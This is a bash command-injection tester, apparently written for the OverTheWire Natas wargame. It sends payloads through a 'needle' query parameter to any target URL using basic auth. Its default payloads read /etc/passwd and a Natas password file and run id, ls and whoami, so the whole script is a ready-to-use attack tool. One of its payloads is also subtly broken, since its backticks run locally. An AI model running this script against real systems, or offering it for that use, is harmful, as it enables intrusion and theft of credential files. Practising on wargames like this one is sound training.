#!/bin/bash

# cmd_injector.sh — Command Injection Tester
# Usage:
#   ./cmd_injector.sh --target URL --auth USER:PASS [--payload PAYLOAD]

set -euo pipefail

# Colors for output
RED="\033[1;31m"
GRN="\033[1;32m"
YEL="\033[1;33m"
NC="\033[0m"

# Defaults
payloads=()
target=""
auth=""
user_agent="cmd_injector.sh"

# Show help
function usage() {
  echo "Usage: $0 --target URL --auth USER:PASS [--payload PAYLOAD]..."
  echo
  echo "  --target    Target URL (e.g. http://example.com/page)"
  echo "  --auth      Basic auth in the form user:pass"
  echo "  --payload   Injection payload(s). Can be repeated."
  echo
  echo "If no --payload is provided, common test payloads are used."
  exit 1
}

# URL-encode function (Python3 inline)
function urlencode() {
  python3 -c "import urllib.parse; print(urllib.parse.quote(\"$1\"))"
}

# Parse args
while [[ $# -gt 0 ]]; do
  case "$1" in
    --target) target="$2"; shift 2 ;;
    --auth) auth="$2"; shift 2 ;;
    --payload) payloads+=("$2"); shift 2 ;;
    -h|--help) usage ;;
    *) echo -e "${RED}[!] Unknown option: $1${NC}"; usage ;;
  esac
done

# Validate
[[ -z "$target" || -z "$auth" ]] && usage

# Default payloads if none provided
if [[ ${#payloads[@]} -eq 0 ]]; then
  payloads+=(
    ";cat /etc/passwd"
    ";sh -c 'cat /etc/natas_webpass/natas10'"
    "| id"
    "|| ls -la"
    "`whoami`"
    ";echo INJECTED"
  )
fi

echo -e "${YEL}[*] Target: $target${NC}"
echo -e "${YEL}[*] Using Auth: $auth${NC}"
echo -e "${YEL}[*] Total payloads: ${#payloads[@]}${NC}"
echo

# Run tests
for payload in "${payloads[@]}"; do
  echo -e "${GRN}[+] Trying payload:${NC} $payload"

  encoded=$(python3 - <<EOF
import urllib.parse
print(urllib.parse.quote("""$payload"""))
EOF
)

  url="${target}?needle=${encoded}&submit=Search"

  curl -s -u "$auth" -A "$user_agent" "$url" | sed -n '/<pre>/,/<\/pre>/p' | sed '1d;$d'
  echo -e "\n"
done

